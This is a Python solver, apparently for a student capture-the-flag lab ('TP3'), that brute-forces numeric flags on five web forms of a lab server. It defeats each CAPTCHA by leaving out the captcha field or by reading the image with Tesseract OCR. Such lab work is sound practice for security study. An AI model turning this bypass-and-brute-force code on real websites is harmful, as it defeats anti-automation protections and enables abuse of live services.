"""
TP3 - Captcha Solver
Resout 5 challenges de CAPTCHA avec bypass.
"""
import requests
import re
from .utils.config import logger


def solve_with_bypass(url, flag_min, flag_max, headers_extra=None):
    """
    Resout un challenge en bypassant le captcha.
    Le bypass consiste à ne PAS envoyer le champ captcha.
    """
    logger.info(f"Bruteforce {flag_min}-{flag_max} (bypass captcha)")
    
    for flag in range(flag_min, flag_max + 1):
        s = requests.Session()
        if headers_extra:
            s.headers.update(headers_extra)
        
        # Charger la page
        s.get(url)
        
        # POST sans captcha = bypass!
        h = {"Content-Type": "application/x-www-form-urlencoded", "Referer": url}
        if headers_extra:
            h.update(headers_extra)
        
        data = f"flag={flag}&submit=Submit"
        r = s.post(url, data=data, headers=h)
        
        if flag % 100 == 0:
            logger.info(f"  flag={flag}...")
        
        # Succes = "Correct" ou "alert-success"
        if "Correct" in r.text or "alert-success" in r.text:
            match = re.search(r'FLAG-\d+\{[^}]+\}', r.text)
            if match:
                return match.group(0)
            else:
                return f"flag={flag}"
    
    return None


def solve_with_ocr(url, flag_min, flag_max, headers_extra=None):
    """
    Resout un challenge avec OCR du captcha.
    Utilise quand le bypass ne fonctionne pas.
    """
    logger.info(f"Bruteforce {flag_min}-{flag_max} (avec OCR)")
    
    try:
        import pytesseract
        from PIL import Image, ImageOps
        from io import BytesIO
        import os
        if os.name == 'nt':
            tesseract_path = r"C:\Program Files\Tesseract-OCR\tesseract.exe"
            if os.path.exists(tesseract_path):
                pytesseract.pytesseract.tesseract_cmd = tesseract_path
    except ImportError:
        logger.error("pytesseract ou PIL non installe")
        return None
    
    base = url.rsplit("/", 2)[0]
    captcha_url = base + "/captcha.php"
    
    flag = flag_min
    while flag <= flag_max:
        s = requests.Session()
        if headers_extra:
            s.headers.update(headers_extra)
        
        # Charger page
        s.get(url)
        
        # Charger captcha
        r = s.get(captcha_url)
        
        try:
            img = Image.open(BytesIO(r.content))
            img = img.convert("L")
            img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
            img = ImageOps.autocontrast(img)
            
            captcha = pytesseract.image_to_string(
                img,
                config="--psm 7 -c tessedit_char_whitelist=0123456789"
            ).strip()
            captcha = "".join(c for c in captcha if c.isdigit())
            
            # Valider: 6 chiffres
            if len(captcha) != 6:
                continue
        except:
            continue
        
        # POST avec captcha
        h = {"Content-Type": "application/x-www-form-urlencoded", "Referer": url}
        if headers_extra:
            h.update(headers_extra)
        
        data = f"flag={flag}&captcha={captcha}&submit=Submit"
        r = s.post(url, data=data, headers=h)
        
        if flag % 100 == 0:
            logger.info(f"  flag={flag} captcha={captcha}")
        
        # Verifier resultat
        if "Correct" in r.text or "alert-success" in r.text:
            match = re.search(r'FLAG-\d+\{[^}]+\}', r.text)
            if match:
                return match.group(0)
            return f"flag={flag}"
        
        if "Incorrect flag" in r.text:
            # Captcha OK, flag incorrect
            flag += 1
        elif "Invalid captcha" in r.text:
            # Captcha faux, retry meme flag
            continue
        else:
            flag += 1
    
    return None


def test_bypass(url, headers_extra=None):
    """Teste si le bypass fonctionne pour ce challenge."""
    s = requests.Session()
    if headers_extra:
        s.headers.update(headers_extra)
    
    s.get(url)
    
    h = {"Content-Type": "application/x-www-form-urlencoded", "Referer": url}
    if headers_extra:
        h.update(headers_extra)
    
    # POST sans captcha
    data = "flag=1500&submit=Submit"
    r = s.post(url, data=data, headers=h)
    
    # Si "Incorrect flag" = bypass OK (captcha non verifie)
    if "Incorrect flag" in r.text:
        return True
    return False


def solve_challenge(num, url, flag_min, flag_max, headers_extra=None):
    """Resout un challenge."""
    logger.info(f"=== Challenge {num} ===")
    logger.info(f"URL: {url}")
    
    # Tester si bypass fonctionne
    if test_bypass(url, headers_extra):
        logger.info("Bypass disponible!")
        return solve_with_bypass(url, flag_min, flag_max, headers_extra)
    else:
        logger.info("Bypass non disponible, utilisation OCR")
        return solve_with_ocr(url, flag_min, flag_max, headers_extra)


def main():
    logger.info("=== TP3 - Captcha Solver ===")
    
    base_url = "http://31.220.95.27:9002"
    
    # Configuration des challenges
    challenges = [
        (1, f"{base_url}/captcha1/", 1000, 2000, None),
        (2, f"{base_url}/captcha2/", 1000, 2000, None),
        (3, f"{base_url}/captcha3/", 1000, 2000, None),
        (4, f"{base_url}/captcha4/", 1000, 2000, {"Magic-Word": "please"}),
        (5, f"{base_url}/captcha5/", 1000, 2000, {"Magic-Word": "please"}),
    ]
    
    flags = {}
    
    for num, url, flag_min, flag_max, headers in challenges:
        flag = solve_challenge(num, url, flag_min, flag_max, headers)
        if flag:
            flags[num] = flag
            logger.info(f"*** FLAG {num}: {flag} ***")
        else:
            logger.warning(f"Challenge {num}: Non trouve")
    
    # Resume
    logger.info("\n" + "=" * 50)
    logger.info("=== TOUS LES FLAGS ===")
    logger.info("=" * 50)
    for i in range(1, 6):
        logger.info(f"Challenge {i}: {flags.get(i, 'Non trouve')}")
    
    return flags


if __name__ == "__main__":
    main()
